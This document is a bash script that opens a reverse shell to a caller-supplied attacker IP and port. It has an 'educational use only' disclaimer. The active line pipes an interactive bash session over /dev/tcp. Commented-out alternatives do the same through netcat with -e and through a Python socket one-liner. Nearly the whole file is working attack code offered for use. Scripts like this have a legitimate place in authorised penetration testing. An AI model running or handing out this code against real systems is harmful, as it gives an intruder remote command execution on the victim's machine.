#!/bin/bash

# This script establishes a reverse shell to the specified attacker IP and port.
# It is intended for educational purposes and ethical testing only.
# Unauthorized use is illegal and unethical.
# Ensure you have explicit permission before using this script on any system.

# Check if the required arguments (attacker IP and port) are provided
if [ $# -ne 2 ]; then
    echo "Usage: $0 <attacker_ip> <port>"
    exit 1
fi

# Assign command-line arguments to variables
ATTACKER_IP=$1
PORT=$2

# Establish reverse shell using bash's /dev/tcp feature
bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1

# Alternative methods (uncomment if /dev/tcp is unavailable):
# Using netcat (if the -e option is supported):
# nc -e /bin/bash $ATTACKER_IP $PORT

# Using Python:
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
